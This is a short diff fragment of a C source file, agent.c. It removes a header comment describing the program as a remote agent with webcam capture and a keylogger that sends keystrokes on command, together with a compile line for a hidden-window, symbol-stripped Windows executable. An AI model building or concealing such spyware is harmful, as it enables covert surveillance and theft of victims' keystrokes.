@@ -1,9 +1,4 @@
-/**
- * agent.c - Complete agent with working camera and fixed keylogger
- * FIXED: Keylogger only sends on command, never auto-sends
- * 
- * Compile: gcc agent.c -o agent.exe -lws2_32 -lgdi32 -luser32 -lole32 -loleaut32 -mwindows -O2 -s
- */
+
 
 #define _CRT_SECURE_NO_WARNINGS
 #define WIN32_LEAN_AND_MEAN
